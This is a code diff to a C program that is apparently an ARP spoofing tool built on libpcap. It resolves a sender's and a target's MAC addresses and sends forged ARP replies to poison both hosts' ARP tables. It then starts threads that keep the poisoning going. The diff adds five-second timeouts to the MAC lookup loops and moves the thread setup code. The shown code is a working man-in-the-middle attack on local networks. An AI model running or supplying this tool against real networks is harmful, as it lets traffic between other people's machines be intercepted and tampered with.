@@ -47,6 +47,8 @@ int main(int argc, char *argv[])
 
 	my_args_struct *info = (my_args_struct *)calloc(1, sizeof(my_args_struct));
 
+	time_t start;
+
 /* get attacker ip address */
 	GET_MY_IP(attacker_IP_char, argv[1]);
 	inet_aton(attacker_IP_char, attacker_IP_struct);
@@ -62,8 +64,10 @@ int main(int argc, char *argv[])
 	printf("[Sender   IP  Address] %s", argv[2]); puts("");
 
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
+	start = time(NULL);
 	do
 	{
+		if (time(NULL) > start + 5) { puts("[-] Failed to get sender MAC address"); puts("[*] Exiting program with -1"); exit(EXIT_FAILURE); }
 		if (pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"pcap_sendpacket error"); }
 		if(GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet)) { break; }
 	} while(1);
@@ -74,8 +78,10 @@ int main(int argc, char *argv[])
 	printf("[Target   IP  Address] %s", argv[3]); puts("");
 
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, target_IP_int);
+	start = time(NULL);
 	do
 	{
+		if (time(NULL) > start + 5) { puts("[-] Failed to get target MAC address"); puts("[*] Exiting program with -1"); exit(EXIT_FAILURE); }
 		if(pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"pcap_sendpacket error"); }
 		if(GET_SENDER_MAC(target_MAC_array, target_IP_int, handle, header, packet)) { break; }
 	} while(1);
@@ -87,14 +93,6 @@ int main(int argc, char *argv[])
 	MAKE_ARPREP_STRUCT(arp_reply2target, attacker_MAC_array, target_MAC_array, target_IP_int, sender_IP_int);
 	puts("[+] Built ARP packets\n");
 
-	pthread_t tid1, tid2;
-
-	strcpy(info->dev, argv[1]);
-	info->sender_IP_int = sender_IP_int;
-	info->target_IP_int = target_IP_int;
-	memcpy(info->arp_reply2sender, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr));
-	memcpy(info->arp_reply2target, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr));
-
 	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
 	else { puts("[  INIT  ] sender <- attacker    target"); }
 	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
@@ -102,6 +100,15 @@ int main(int argc, char *argv[])
 	puts(""); 
 
 	puts("[+] Sent initial fake ARP packets to poison sender and target's ARP table for the first time\n");
+
+
+	pthread_t tid1, tid2;
+
+	strcpy(info->dev, argv[1]);
+	info->sender_IP_int = sender_IP_int;
+	info->target_IP_int = target_IP_int;
+	memcpy(info->arp_reply2sender, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr));
+	memcpy(info->arp_reply2target, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr));
 
 // Extra level of assurance
 	pthread_create(&tid1, NULL, SEND_ARP, (void *)info);
